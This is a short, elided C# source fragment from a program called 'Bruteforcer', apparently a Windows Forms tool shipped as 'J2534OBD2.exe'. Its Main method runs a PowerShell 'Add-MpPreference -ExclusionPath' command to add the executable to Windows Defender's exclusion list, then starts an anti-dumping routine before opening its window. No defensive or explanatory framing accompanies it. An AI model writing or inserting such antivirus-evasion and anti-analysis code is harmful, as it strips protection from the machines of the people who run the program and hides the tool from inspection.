...
namespace Bruteforcer
{
    static class Program
    {
        ...
        static void Main()
        {
			...
			string executablePath = @"J2534OBD2.exe";
			// Execute PowerShell command to add the executable to Windows Defender allowed list
			ExecutePowerShellCommand($"Add-MpPreference -ExclusionPath \"{executablePath}\"");
			Console.WriteLine("Executable added to Windows Defender allowed list.");
			AntiDump.Initialize();
			Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Bruteforcer());
        }
    }
